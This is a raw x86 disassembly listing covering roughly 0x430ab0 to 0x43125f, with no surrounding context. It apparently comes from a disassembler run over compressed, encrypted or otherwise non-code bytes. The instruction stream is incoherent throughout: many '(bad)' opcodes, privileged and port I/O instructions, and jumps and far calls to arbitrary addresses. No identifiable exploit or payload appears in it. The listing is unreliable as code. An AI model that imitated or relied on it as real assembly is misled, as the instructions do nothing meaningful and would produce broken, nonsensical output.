  430ab0:	xchg   edx,eax
  430ab1:	or     al,0x8b
  430ab3:	jae    0x430aad
  430ab5:	ds pop es
  430ab7:	pop    edx
  430ab8:	imul   eax,eax,0xaf2ed360
  430abe:	and    bl,0x22
  430ac1:	cs loopne 0x430a7c
  430ac4:	pop    ecx
  430ac5:	retf   0xb32c
  430ac8:	leave  
  430ac9:	daa    
  430aca:	mov    cl,0x2f
  430acc:	mov    bp,WORD PTR [ebp+0x63]
  430ad0:	adc    BYTE PTR es:[ebp-0x4],0x62
  430ad5:	shl    DWORD PTR [eax-0x1e],cl
  430ad8:	push   0x6c
  430ada:	dec    esp
  430adb:	aam    0xb9
  430add:	fwait
  430ade:	dec    edx
  430adf:	mov    esi,0x348d4452
  430ae4:	icebp  
  430ae5:	mov    eax,ds:0x4b83b536
  430aea:	into   
  430aeb:	push   esi
  430aec:	sub    cl,BYTE PTR [eax+0x51]
  430aef:	icebp  
  430af0:	or     BYTE PTR [ebp-0x529d2ab9],dh
  430af6:	pop    ss
  430af7:	pop    ss
  430af8:	or     eax,0x88e1a619
  430afd:	stc    
  430afe:	xchg   esi,eax
  430aff:	retf   
  430b00:	cs iret 
  430b02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430b03:	mov    esp,0xce0e023e
  430b08:	retf   
  430b09:	or     eax,0x74b82d06
  430b0e:	push   ds
  430b0f:	cdq    
  430b10:	arpl   ax,si
  430b12:	enter  0xbe04,0xfa
  430b16:	es aam 0xfc
  430b19:	cld    
  430b1a:	xchg   ebx,eax
  430b1b:	sbb    DWORD PTR ds:0x88a65658,esi
  430b21:	dec    edi
  430b22:	push   ss
  430b23:	rcl    edx,cl
  430b25:	stos   BYTE PTR es:[edi],al
  430b26:	cmp    DWORD PTR [edi+0x67],eax
  430b29:	add    esi,DWORD PTR [ebp+ecx*2+0x6]
  430b2d:	dec    esp
  430b2e:	(bad)  
  430b30:	jl     0x430b38
  430b32:	ins    BYTE PTR es:[edi],dx
  430b33:	xor    esp,edx
  430b35:	add    eax,0x27514225
  430b3a:	in     al,0x89
  430b3c:	retf   
  430b3d:	imul   DWORD PTR [edx-0x1b7a0cb9]
  430b43:	sbb    DWORD PTR [ebx+eiz*1+0x1f],ebx
  430b47:	push   ecx
  430b48:	mov    eax,ds:0x52c264cf
  430b4d:	cld    
  430b4e:	xchg   edi,eax
  430b4f:	aad    0x22
  430b51:	js     0x430b7d
  430b53:	out    dx,eax
  430b54:	jb     0x430b8b
  430b56:	(bad)  
  430b57:	das    
  430b58:	mov    ch,0x1d
  430b5a:	adc    bh,bl
  430b5c:	or     BYTE PTR [ebx],cl
  430b5e:	aas    
  430b5f:	pop    eax
  430b60:	ins    BYTE PTR es:[edi],dx
  430b61:	std    
  430b62:	fadd   DWORD PTR [eax+eax*8+0x2]
  430b66:	call   0xca19dcf0
  430b6b:	stos   BYTE PTR es:[edi],al
  430b6c:	ja     0x430bb9
  430b6e:	ins    BYTE PTR es:[edi],dx
  430b6f:	out    0xaf,eax
  430b71:	les    esp,FWORD PTR [ebx+0x46]
  430b74:	push   esi
  430b75:	add    bh,BYTE PTR [edi+ecx*8]
  430b78:	xchg   esi,eax
  430b79:	jmp    FWORD PTR [eax+0x3d4c7e9e]
  430b7f:	push   esp
  430b80:	fndisi(8087 only) 
  430b82:	mov    eax,ds:0x600f2455
  430b87:	inc    ebx
  430b88:	cs add eax,0xfcda91b4
  430b8e:	inc    esi
  430b8f:	std    
  430b90:	push   ebx
  430b91:	add    edi,DWORD PTR [eax-0x2ff480d1]
  430b97:	imul   esp,DWORD PTR [esi+0x55],0x2b0999b
  430b9e:	lds    eax,FWORD PTR [eax+0x66]
  430ba1:	call   0x3b54393
  430ba6:	cmp    BYTE PTR ds:0x247f9d8f,0x8c
  430bad:	cmc    
  430bae:	popa   
  430baf:	fld    QWORD PTR [ecx-0xb]
  430bb2:	and    al,BYTE PTR [edi]
  430bb4:	or     eax,0xfffffff8
  430bb7:	pop    edx
  430bb8:	cdq    
  430bb9:	and    al,0x3e
  430bbb:	shl    al,0x93
  430bbe:	es inc edi
  430bc0:	stos   BYTE PTR es:[edi],al
  430bc1:	xchg   edx,eax
  430bc2:	dec    edi
  430bc3:	repnz (bad) 
  430bc5:	call   0xf911dd2a
  430bca:	dec    ebp
  430bcb:	mov    ebx,0xd45f3638
  430bd0:	stc    
  430bd1:	paddw  mm5,QWORD PTR [eax]
  430bd4:	sbb    al,0x12
  430bd6:	mov    edi,0x6b3f8c69
  430bdb:	stos   BYTE PTR es:[edi],al
  430bdc:	xchg   ebp,eax
  430bdd:	inc    ebx
  430bde:	push   edi
  430bdf:	adc    eax,0xd7413e8e
  430be4:	mov    ecx,0xa4d46365
  430be9:	cwde   
  430bea:	pop    edi
  430beb:	push   esp
  430bec:	jb     0x430c52
  430bee:	addr16 iret 
  430bf0:	ds aam 0x49
  430bf3:	ror    DWORD PTR [eax-0x251ca680],1
  430bf9:	add    eax,0x6c360456
  430bfe:	add    al,0x34
  430c00:	and    dh,BYTE PTR [ebp+0x47d3cb1f]
  430c06:	mov    esp,0xe058f228
  430c0b:	fisttp WORD PTR [eax+0x21]
  430c0e:	push   ebx
  430c0f:	aad    0xa2
  430c11:	call   0xa6cceac2
  430c16:	mov    bh,0xbe
  430c18:	mov    BYTE PTR [ebp-0x5e],al
  430c1b:	push   eax
  430c1c:	sbb    BYTE PTR [edx-0x18],ch
  430c1f:	cmp    ch,bh
  430c21:	mov    BYTE PTR [ecx+0x3615884f],al
  430c27:	cmp    edx,edx
  430c29:	pop    ds
  430c2a:	adc    DWORD PTR [ecx+0x10],ebp
  430c2d:	lock rcl ebp,cl
  430c30:	lock dec esp
  430c32:	and    BYTE PTR [edi+0x8],dl
  430c35:	jo     0x430bd9
  430c37:	aad    0x5a
  430c39:	out    dx,al
  430c3a:	push   es
  430c3b:	xchg   ecx,eax
  430c3c:	outs   dx,BYTE PTR ds:[esi]
  430c3d:	mov    esp,0x5796859e
  430c42:	sbb    eax,0x9bc38a97
  430c47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430c48:	cli    
  430c49:	pop    ebp
  430c4a:	jmp    DWORD PTR [eax]
  430c4c:	mov    eax,0xf2d469f6
  430c51:	test   al,0x6c
  430c53:	adc    al,0x2e
  430c55:	shl    DWORD PTR [edi],1
  430c57:	ja     0x430be2
  430c59:	popa   
  430c5a:	fldenv [esi+ecx*8+0x66]
  430c5e:	lea    ebp,[ebx-0x749fd4d]
  430c64:	ret    0x8930
  430c67:	mov    esi,0x31f93e9
  430c6c:	or     dl,BYTE PTR [ecx-0x37]
  430c6f:	xor    eax,DWORD PTR [eax]
  430c71:	popa   
  430c72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430c73:	aad    0xc7
  430c75:	fild   QWORD PTR [eax+0x47]
  430c78:	pop    ss
  430c79:	xor    eax,0xb891e6f
  430c7e:	mov    bl,0xf7
  430c80:	push   esp
  430c81:	mov    cl,0x5b
  430c83:	push   ebp
  430c84:	lods   eax,DWORD PTR ds:[esi]
  430c85:	add    dl,ah
  430c87:	iret   
  430c88:	shr    eax,cl
  430c8a:	imul   ebp,esi,0x75
  430c8d:	shl    DWORD PTR [eax+0x75],0x8f
  430c91:	or     al,0x40
  430c93:	adc    al,0x62
  430c95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430c96:	call   ebx
  430c98:	sbb    BYTE PTR [eax],dh
  430c9a:	lock mov al,0xca
  430c9d:	repnz data16 mov bl,BYTE PTR [eax-0x63]
  430ca2:	rcl    BYTE PTR [eax+0x149fd89],0x1c
  430ca9:	dec    ebp
  430caa:	pop    edx
  430cab:	pop    edx
  430cac:	lahf   
  430cad:	add    eax,0x7ee81bac
  430cb2:	dec    esp
  430cb3:	repnz shl DWORD PTR [ecx],1
  430cb6:	push   ds
  430cb7:	pop    ss
  430cb8:	sub    al,0x69
  430cba:	mov    ah,0xd7
  430cbc:	push   es
  430cbd:	je     0x430cdd
  430cbf:	aam    0xe3
  430cc1:	xchg   esp,eax
  430cc2:	push   cs
  430cc3:	sbb    DWORD PTR [ebp-0x4cbca424],0x8877c129
  430ccd:	test   DWORD PTR [ebp+eax*4-0x75],esp
  430cd1:	push   esi
  430cd2:	pusha  
  430cd3:	repz fsub DWORD PTR [edi]
  430cd6:	inc    eax
  430cd7:	jae    0x430ce4
  430cd9:	(bad)  
  430cda:	pusha  
  430cdb:	jno    0x430c93
  430cdd:	leave  
  430cde:	(bad)  
  430cdf:	dec    ecx
  430ce0:	xchg   edi,eax
  430ce1:	add    DWORD PTR [esp+ebp*4],ebx
  430ce4:	cld    
  430ce5:	fbld   TBYTE PTR [esi+0x31]
  430ce8:	ret    0x8282
  430ceb:	xchg   edi,eax
  430cec:	es or  al,0xf1
  430cef:	aad    0xce
  430cf1:	mov    eax,ds:0xb20d3bb7
  430cf6:	sub    ebp,esp
  430cf8:	clc    
  430cf9:	das    
  430cfa:	inc    eax
  430cfb:	stos   BYTE PTR es:[edi],al
  430cfc:	call   0x16b9:0xe8055cf6
  430d03:	push   0xb7620214
  430d08:	mov    cl,0x10
  430d0a:	xor    al,dh
  430d0c:	or     DWORD PTR [ebx+0x1e],esp
  430d0f:	inc    ecx
  430d10:	mov    esi,DWORD PTR [esi-0x43]
  430d13:	test   BYTE PTR [eax+0x3a985b98],0x7
  430d1a:	icebp  
  430d1b:	aad    0xa4
  430d1d:	jmp    0x430ccc
  430d1f:	pop    ecx
  430d20:	mov    al,ds:0x6c337dd4
  430d25:	hlt    
  430d26:	jl     0x430d7c
  430d28:	sahf   
  430d29:	lods   eax,DWORD PTR ds:[esi]
  430d2a:	inc    ecx
  430d2b:	push   edi
  430d2c:	(bad)  
  430d2e:	sbb    al,0xa7
  430d31:	add    eax,0x225928e6
  430d36:	cmp    BYTE PTR [ecx],ch
  430d38:	adc    DWORD PTR [ecx],eax
  430d3a:	mov    esi,0x42b58926
  430d3f:	mov    edi,0x607fe384
  430d44:	jmp    ebp
  430d46:	hlt    
  430d47:	inc    ebp
  430d48:	adc    BYTE PTR [esi+ebp*2+0x67cd7515],al
  430d4f:	dec    edx
  430d50:	addr16 mov ds:0xfb78,eax
  430d54:	add    eax,0x1cb31e6d
  430d59:	ds dec edx
  430d5b:	dec    ebp
  430d5c:	cmp    BYTE PTR [edi-0x1],0xb8
  430d60:	mov    esp,0x491f9189
  430d65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430d66:	xchg   edi,eax
  430d67:	gs inc edx
  430d69:	pushf  
  430d6a:	pop    ds
  430d6b:	icebp  
  430d6c:	mov    dl,BYTE PTR [ecx]
  430d6e:	pop    ss
  430d6f:	mov    BYTE PTR [esi-0x732b8bc6],ah
  430d75:	push   ebx
  430d76:	(bad)  
  430d77:	sub    edi,esp
  430d79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430d7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430d7b:	pusha  
  430d7c:	mov    BYTE PTR [edi+0x7d],bh
  430d7f:	dec    esp
  430d80:	push   ebx
  430d81:	jo     0x430d73
  430d83:	test   DWORD PTR [ecx+0x42a21614],eax
  430d89:	fisub  DWORD PTR [ebp+esi*2+0x7ac62e33]
  430d90:	push   0xc491f3e
  430d95:	cld    
  430d96:	les    edi,FWORD PTR [ecx-0x2aa25832]
  430d9c:	ins    BYTE PTR es:[edi],dx
  430d9d:	test   DWORD PTR [edx+ebp*8+0xa3123b2],0x1b1f6d64
  430da8:	mov    ah,al
  430daa:	data16 mov al,ds:0xc706a8d0
  430db0:	lods   al,BYTE PTR ds:[esi]
  430db1:	loop   0x430dfd
  430db3:	mov    edx,0xf5b2e6e4
  430db8:	adc    al,0x44
  430dba:	fistp  WORD PTR [edx+ebp*8+0x0]
  430dbe:	mov    ecx,0xe75f9505
  430dc3:	es jecxz 0x430dcb
  430dc6:	xchg   edx,eax
  430dc7:	js     0x430e19
  430dc9:	ins    DWORD PTR es:[edi],dx
  430dca:	mov    ds:0x5ea5dd5,al
  430dcf:	pop    ebx
  430dd0:	dec    esi
  430dd1:	aas    
  430dd2:	cwde   
  430dd3:	lds    ecx,FWORD PTR [ecx+edx*1+0x10e43735]
  430dda:	fcom   QWORD PTR [esp+eax*4]
  430ddd:	push   ebp
  430dde:	outs   dx,BYTE PTR ds:[esi]
  430ddf:	aad    0x7b
  430de1:	push   0x5d
  430de3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430de4:	repz xlat BYTE PTR ds:[ebx]
  430de6:	adc    eax,0x9621f1f9
  430deb:	stos   BYTE PTR es:[edi],al
  430dec:	fadd   QWORD PTR [esp+ecx*8]
  430def:	xchg   BYTE PTR [eax+0x51],ch
  430df2:	stos   DWORD PTR es:[edi],eax
  430df3:	add    ch,dl
  430df5:	sti    
  430df6:	fisttp QWORD PTR [ecx-0x28e7dfa8]
  430dfc:	push   esp
  430dfd:	rcl    BYTE PTR [ecx+0x1faadc30],1
  430e03:	gs leave 
  430e05:	outs   dx,DWORD PTR ds:[esi]
  430e06:	fxch   st(7)
  430e08:	jbe    0x430dd7
  430e0a:	pop    edi
  430e0b:	mov    edx,0x6930438a
  430e10:	enter  0x96fb,0xb0
  430e14:	ja     0x430e4e
  430e16:	jle    0x430e48
  430e18:	mov    ebp,ebx
  430e1a:	ret    0x7f02
  430e1d:	out    0xf1,al
  430e1f:	add    BYTE PTR [edi],0xaa
  430e22:	pusha  
  430e23:	test   DWORD PTR [ecx+ecx*8+0x48],esp
  430e27:	mov    ebx,0x9a36074d
  430e2c:	or     DWORD PTR [ecx+eax*2],edx
  430e2f:	adc    DWORD PTR [ecx],eax
  430e31:	xchg   edx,eax
  430e32:	pusha  
  430e33:	pop    ecx
  430e34:	ficomp WORD PTR [esi-0x1117a0df]
  430e3a:	push   ds
  430e3b:	xlat   BYTE PTR ds:[ebx]
  430e3c:	xor    bl,BYTE PTR [ecx]
  430e3e:	shl    DWORD PTR [eax+0x6c],0xc2
  430e42:	adc    DWORD PTR [eax+0x7d379988],ebx
  430e48:	bound  ebp,QWORD PTR [eax-0x6c]
  430e4b:	int3   
  430e4c:	mov    ecx,0x3447ba03
  430e51:	imul   ebp,DWORD PTR [ecx],0x9e0a4b22
  430e57:	imul   ecx,DWORD PTR [ebp+esi*4-0x33a69ae3],0x7f
  430e5f:	push   edi
  430e60:	push   es
  430e61:	jmp    0x62cd17d
  430e66:	xor    dl,ch
  430e68:	mov    DWORD PTR [esi+eax*1+0x1f],ecx
  430e6c:	das    
  430e6d:	sti    
  430e6e:	stos   DWORD PTR es:[edi],eax
  430e6f:	xor    esp,eax
  430e71:	push   esi
  430e72:	pop    ds
  430e73:	push   ebp
  430e74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430e75:	mov    ebp,0x28e9dcd
  430e7a:	or     cl,BYTE PTR [edi]
  430e7c:	(bad)
  430e7f:	mov    al,0x1c
  430e81:	int3   
  430e82:	cwde   
  430e83:	mov    ebx,0x93841d51
  430e88:	fist   WORD PTR [esi+eax*4+0x13102282]
  430e8f:	pushw  0xc25a
  430e93:	aam    0x45
  430e95:	cmp    eax,0xda28932c
  430e9a:	mov    bl,0xc2
  430e9c:	xchg   ebp,ebx
  430e9e:	push   0xe3f2ef29
  430ea3:	and    al,0xc4
  430ea5:	pushf  
  430ea6:	mov    dl,0x15
  430ea8:	nop
  430ea9:	fsubr  QWORD PTR [edi-0x2b]
  430eac:	div    DWORD PTR [edi]
  430eae:	push   0x23c5dba6
  430eb3:	pop    es
  430eb4:	jo     0x430ea5
  430eb6:	call   FWORD PTR gs:[ebp-0x17]
  430eba:	movups xmm2,XMMWORD PTR [ebp+0x23]
  430ebe:	mov    ch,0x60
  430ec0:	fimul  WORD PTR [ebp+0x3c]
  430ec3:	(bad)  
  430ec4:	jp     0x430ec9
  430ec6:	ror    dh,cl
  430ec8:	jmp    0x88daa181
  430ecd:	fst    DWORD PTR [edi-0x2ea3fc9c]
  430ed3:	iret   
  430ed4:	loopne 0x430edb
  430ed6:	cli    
  430ed7:	cmp    al,0x7b
  430ed9:	jl     0x430eba
  430edb:	gs push ebp
  430edd:	pushf  
  430ede:	pop    ds
  430edf:	paddw  mm0,QWORD PTR [edx+0x5c]
  430ee3:	out    0x68,eax
  430ee5:	push   ds
  430ee6:	aaa    
  430ee7:	aam    0xca
  430ee9:	pop    ss
  430eea:	pop    ss
  430eeb:	jl     0x430f3c
  430eed:	sbb    edi,DWORD PTR [edi+0x3b]
  430ef0:	mov    al,ds:0x60c10a27
  430ef5:	add    edx,DWORD PTR [edx-0x762dd740]
  430efb:	dec    ebx
  430efc:	loopne 0x430f1c
  430efe:	(bad)  
  430eff:	loop   0x430f51
  430f01:	jl     0x430eb5
  430f03:	test   eax,0x77200848
  430f08:	mov    edi,ebx
  430f0a:	inc    eax
  430f0b:	ss xchg edi,eax
  430f0d:	and    DWORD PTR ds:0xe05690ab,edx
  430f13:	jecxz  0x430f72
  430f15:	add    bl,al
  430f17:	inc    edx
  430f18:	mov    al,0xc4
  430f1a:	sbb    esp,DWORD PTR [eax-0x77]
  430f1d:	imul   edi,DWORD PTR [edx-0x8],0x14
  430f21:	div    BYTE PTR [edx-0x78]
  430f24:	or     BYTE PTR [edx],al
  430f26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430f27:	in     al,dx
  430f28:	dec    edi
  430f29:	or     DWORD PTR [edx-0x4d],ebx
  430f2c:	push   eax
  430f2d:	aas    
  430f2e:	fs and eax,0x32404477
  430f34:	xor    esi,DWORD PTR [edx+0x22b3a78]
  430f3a:	cmp    al,bh
  430f3c:	(bad)  
  430f3d:	sbb    BYTE PTR [ecx],dh
  430f3f:	push   ds
  430f40:	cmc    
  430f41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430f42:	data16 repz in al,dx
  430f45:	cmp    BYTE PTR [ebx-0x41],bl
  430f48:	push   eax
  430f49:	mov    ds:0x32373ae,al
  430f4e:	les    ebp,FWORD PTR [ebp+0x3646612f]
  430f54:	es jne 0x430f76
  430f57:	in     eax,0x5
  430f59:	dec    ebp
  430f5a:	jno    0x430f2c
  430f5c:	and    al,0xd0
  430f5e:	dec    edx
  430f5f:	pushf  
  430f60:	xchg   DWORD PTR [eax],ebp
  430f62:	out    dx,al
  430f63:	aad    0x4b
  430f65:	ja     0x430f37
  430f67:	jecxz  0x430f5a
  430f69:	jo     0x430f22
  430f6b:	mov    edx,DWORD PTR [esi-0x6e]
  430f6e:	pusha  
  430f6f:	pop    es
  430f70:	(bad)  
  430f71:	adc    eax,0xc1f42018
  430f76:	(bad)  
  430f77:	aam    0x6e
  430f79:	jns    0x430fae
  430f7b:	(bad)  [esi]
  430f7d:	push   ds
  430f7e:	test   al,0x28
  430f80:	mov    DWORD PTR [ecx-0x25ed5ffa],esp
  430f86:	shl    DWORD PTR ds:0x1ff40268,0x49
  430f8d:	data16 mov bh,0x47
  430f90:	adc    esi,edi
  430f92:	bound  ebp,QWORD PTR [ecx-0x34]
  430f95:	inc    ebp
  430f96:	cmp    bh,BYTE PTR [ebp-0x1b70a699]
  430f9c:	mov    DWORD PTR [edx],edi
  430f9e:	push   ecx
  430f9f:	mov    dl,0x66
  430fa1:	in     al,0x3f
  430fa3:	mov    ah,0xfc
  430fa5:	pmaxub mm1,QWORD PTR [ecx+0x2d65bdfc]
  430fac:	fisub  DWORD PTR [ecx+0x38]
  430faf:	xor    al,0x63
  430fb1:	pop    esi
  430fb2:	dec    ecx
  430fb3:	inc    edx
  430fb4:	repz and BYTE PTR [esi],bl
  430fb7:	adc    bh,BYTE PTR [edx-0x51]
  430fba:	xchg   edx,eax
  430fbb:	data16 ds adc al,0x15
  430fbf:	(bad)  
  430fc0:	mov    BYTE PTR [ecx-0x39b51e00],ch
  430fc6:	lock test eax,0xbbfc033d
  430fcc:	scas   eax,DWORD PTR es:[edi]
  430fcd:	xchg   eax,ecx
  430fcf:	mov    al,0xc4
  430fd1:	(bad)  
  430fd2:	pop    ds
  430fd3:	pop    es
  430fd4:	add    DWORD PTR [ebx],esi
  430fd6:	inc    ecx
  430fd7:	aad    0x1c
  430fd9:	retf   
  430fda:	mov    eax,ds:0x60505cd4
  430fdf:	ds mov ah,0x4e
  430fe2:	cwde   
  430fe3:	sub    DWORD PTR [ecx+0x3ea133df],ecx
  430fe9:	cmp    ch,bh
  430feb:	stc    
  430fec:	mov    dh,0xc5
  430fee:	in     eax,dx
  430fef:	pop    esp
  430ff0:	mov    bh,0x4c
  430ff2:	add    bl,BYTE PTR [ebp-0x77]
  430ff5:	mov    cl,0x6
  430ff7:	neg    BYTE PTR [ecx+esi*8]
  430ffa:	fsqrt  
  430ffc:	add    BYTE PTR [ebx],0xee
  430fff:	or     esp,DWORD PTR [ebp-0x17]
  431002:	(bad)  
  431003:	int3   
  431004:	fdivp  st(5),st
  431006:	xchg   BYTE PTR [esi-0x47],bh
  431009:	xor    DWORD PTR [ebx],edi
  43100b:	mov    ch,0xc0
  43100d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43100e:	cmp    esp,edx
  431010:	dec    ebp
  431011:	(bad)  
  431013:	sub    al,0x87
  431015:	adc    eax,0x406cd4b7
  43101a:	jnp    0x431023
  43101c:	popa   
  43101d:	pop    edi
  43101e:	pop    esi
  43101f:	push   esp
  431020:	fimul  WORD PTR [ecx-0x15]
  431023:	out    dx,al
  431024:	push   ds
  431025:	add    ah,BYTE PTR [eax+0x2b]
  431028:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431029:	push   esi
  43102a:	pop    ebx
  43102b:	mov    bh,0x19
  43102d:	inc    ebp
  43102e:	sbb    edi,ecx
  431030:	mov    BYTE PTR [ecx],ah
  431032:	dec    DWORD PTR [edi]
  431034:	inc    ecx
  431035:	push   edi
  431036:	push   0x12036edd
  43103b:	call   0xc317:0x2865b060
  431042:	pop    ds
  431043:	pop    ebp
  431044:	jbe    0x430fd8
  431046:	clc    
  431047:	cld    
  431048:	inc    esp
  431049:	aaa    
  43104a:	add    ch,BYTE PTR [edx-0x72d7ce21]
  431050:	jmp    0x57106797
  431055:	jno    0x431076
  431057:	scas   eax,DWORD PTR es:[edi]
  431058:	adc    dl,BYTE PTR [edi-0x191543a4]
  43105e:	jge    0x431035
  431060:	inc    ebx
  431061:	adc    al,0xa2
  431063:	not    DWORD PTR [esi-0x52]
  431066:	test   al,0x71
  431068:	mov    DWORD PTR [ebp-0x16c95622],edx
  43106e:	inc    esp
  43106f:	int    0xd8
  431071:	es scas al,BYTE PTR es:[edi]
  431073:	cmp    esi,edi
  431075:	mov    edi,0x8169845f
  43107a:	sub    ebp,DWORD PTR [edi]
  43107c:	mov    ch,BYTE PTR ds:0xb02dda6e
  431082:	aas    
  431083:	mov    edx,0xd441187d
  431088:	lea    edi,[esi-0x48776c5a]
  43108e:	jae    0x4310d8
  431090:	ds in  al,0x3
  431093:	out    0x3,eax
  431095:	aas    
  431096:	sub    bl,ch
  431098:	sbb    al,0x3
  43109a:	into   
  43109b:	sub    eax,0x884377d8
  4310a0:	mov    dh,0xd
  4310a2:	and    DWORD PTR [edx+ecx*1-0x446670a],esi
  4310a9:	sti    
  4310aa:	fmul   DWORD PTR [esi]
  4310ac:	mov    WORD PTR [eax],ss
  4310ae:	(bad)  
  4310af:	jnp    0x4310a6
  4310b1:	pop    es
  4310b2:	pop    ds
  4310b3:	ins    BYTE PTR es:[edi],dx
  4310b4:	aaa    
  4310b5:	ret    
  4310b6:	add    eax,0xe597b511
  4310bb:	sub    eax,0xea05608
  4310c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4310c1:	(bad)  [ebx-0x6fd94f54]
  4310c7:	shl    BYTE PTR [ecx-0x51936097],1
  4310cd:	out    0x59,eax
  4310cf:	shl    ebx,cl
  4310d1:	add    eax,0xe9b71bcb
  4310d6:	add    eax,0x346928bb
  4310db:	mov    BYTE PTR [eax-0x7c3fe3a7],cl
  4310e1:	jne    0x43106a
  4310e3:	loopne 0x4310f6
  4310e5:	sbb    edi,DWORD PTR [esi]
  4310e7:	mov    esi,esi
  4310e9:	push   es
  4310ea:	(bad)  
  4310eb:	push   ebp
  4310ec:	sbb    dh,BYTE PTR [ebx]
  4310ee:	or     bl,BYTE PTR [esi-0x16457077]
  4310f4:	nop
  4310f5:	call   0x265a77b
  4310fa:	xor    bl,BYTE PTR [ebp-0x7ce74d5d]
  431100:	mov    bh,0xf4
  431102:	pusha  
  431103:	mov    cl,0x55
  431105:	mov    ds:0x3c18f44b,al
  43110a:	xchg   edi,eax
  43110b:	aad    0xda
  43110d:	ins    DWORD PTR es:[edi],dx
  43110e:	or     al,0x42
  431110:	or     ebx,ecx
  431112:	mov    ebx,0x61778a8f
  431117:	cmp    eax,ebx
  431119:	adc    DWORD PTR [ebp-0xb],edx
  43111c:	cmp    BYTE PTR [ebp+0x7f33d443],bl
  431122:	lock in al,0xdb
  431125:	xchg   BYTE PTR [esi+ecx*2-0x53ef2277],cl
  43112c:	test   eax,0x9a850242
  431131:	pop    ss
  431132:	cld    
  431133:	lahf   
  431134:	push   ecx
  431135:	outs   dx,BYTE PTR ds:[esi]
  431136:	mov    cl,0x55
  431138:	sub    DWORD PTR [edi],eax
  43113a:	ins    DWORD PTR es:[edi],dx
  43113b:	pop    esp
  43113c:	mov    ch,ah
  43113e:	fnstsw WORD PTR [esi]
  431140:	lds    edi,FWORD PTR [eax+0x22eb393]
  431146:	push   esi
  431147:	(bad)  
  431148:	jge    0x431158
  43114a:	mov    BYTE PTR ds:0xd75b70c8,dl
  431150:	add    al,0x7
  431152:	pop    ds
  431153:	div    edx
  431155:	inc    ebx
  431156:	or     BYTE PTR [eax],0x29
  431159:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43115a:	nop
  43115b:	jae    0x43116c
  43115d:	pop    ss
  43115e:	lahf   
  43115f:	(bad)  
  431160:	fidiv  WORD PTR [edi+ecx*8]
  431163:	cmp    al,0x16
  431165:	dec    ebx
  431166:	pop    ds
  431167:	jae    0x4311c8
  431169:	jmp    0x4310fb
  43116b:	stmxcsr DWORD PTR [edi+0xa07d476]
  431172:	add    al,0x1f
  431174:	in     al,0xbd
  431176:	hlt    
  431177:	test   BYTE PTR [ebx+0x373e90b7],0x8c
  43117e:	jg     0x431172
  431180:	push   0x14bb254d
  431185:	jae    0x4311c5
  431187:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431188:	xchg   ebp,eax
  431189:	addr16 push ds
  43118b:	mov    ebx,0x3c0e695e
  431190:	mov    bh,bh
  431192:	and    eax,0xb5d51826
  431197:	inc    esp
  431198:	add    cl,BYTE PTR ss:[esi+esi*1-0x1f8e572]
  4311a0:	ret    0x60ea
  4311a3:	ins    DWORD PTR es:[edi],dx
  4311a4:	mov    bl,BYTE PTR [edx]
  4311a6:	jbe    0x431203
  4311a8:	pop    eax
  4311a9:	pop    ebp
  4311aa:	sub    al,0xd7
  4311ac:	jo     0x4311f6
  4311ae:	(bad)  [edi+0x2be345d9]
  4311b4:	mov    ebp,edi
  4311b6:	sub    BYTE PTR [esi-0x2a],ch
  4311b9:	ret    
  4311ba:	lods   eax,DWORD PTR ds:[esi]
  4311bb:	std    
  4311bc:	cwde   
  4311bd:	add    eax,0x768f8042
  4311c2:	ficomp WORD PTR [ecx+eax*1]
  4311c5:	jmp    DWORD PTR [eax-0xb]
  4311c8:	mov    ds:0x28550188,eax
  4311cd:	out    0x87,al
  4311cf:	aad    0xb1
  4311d1:	sub    ebp,DWORD PTR [edx+0x3a]
  4311d4:	hlt    
  4311d5:	sub    DWORD PTR [edx+0x5569f105],0x10a64ed5
  4311df:	fcomp  QWORD PTR [edx+0x1d]
  4311e2:	leave  
  4311e3:	aam    0x26
  4311e5:	daa    
  4311e6:	adc    edi,DWORD PTR [esi+0x19]
  4311e9:	xchg   cl,bl
  4311eb:	cmp    eax,0x8b8f8b97
  4311f0:	add    ebp,0x1308d5e9
  4311f6:	sbb    bl,BYTE PTR [edx+0x55cf608e]
  4311fc:	or     DWORD PTR [eax],ebp
  4311fe:	xchg   DWORD PTR [eax],edi
  431200:	adc    al,BYTE PTR [esi+0x680daf60]
  431206:	leave  
  431207:	sub    cl,dh
  431209:	stos   DWORD PTR es:[edi],eax
  43120a:	ins    BYTE PTR es:[edi],dx
  43120b:	iret   
  43120c:	int3   
  43120d:	inc    edi
  43120e:	cli    
  43120f:	push   esi
  431210:	jg     0x431215
  431212:	jbe    0x431245
  431214:	push   eax
  431216:	inc    ecx
  431217:	sbb    BYTE PTR [esi-0x5b484ce5],cl
  43121d:	adc    eax,0xdcb2249e
  431222:	add    dl,ah
  431224:	aas    
  431225:	jbe    0x4311cd
  431227:	das    
  431228:	out    0x1b,al
  43122a:	or     BYTE PTR [edx],ch
  43122c:	mov    ecx,ecx
  43122e:	or     cl,bh
  431230:	jnp    0x43126b
  431232:	fxch   st(0)
  431234:	les    eax,FWORD PTR [ebx]
  431236:	inc    esi
  431237:	outs   dx,BYTE PTR ds:[esi]
  431238:	adc    dh,BYTE PTR [edx]
  43123a:	loopne 0x4311f9
  43123c:	nop
  43123d:	or     al,BYTE PTR [esi+0x6f85884e]
  431243:	in     eax,dx
  431244:	add    al,0xc1
  431246:	int    0xb7
  431248:	hlt    
  431249:	dec    ecx
  43124a:	xor    BYTE PTR [ecx+eiz*1],0xa4
  43124e:	and    ecx,DWORD PTR [ecx]
  431250:	or     ch,al
  431252:	sub    eax,0x62b63301
  431257:	mul    DWORD PTR [esi-0x240e286d]
  43125d:	invd   
  43125f:	add    DWORD PTR [edi],esp
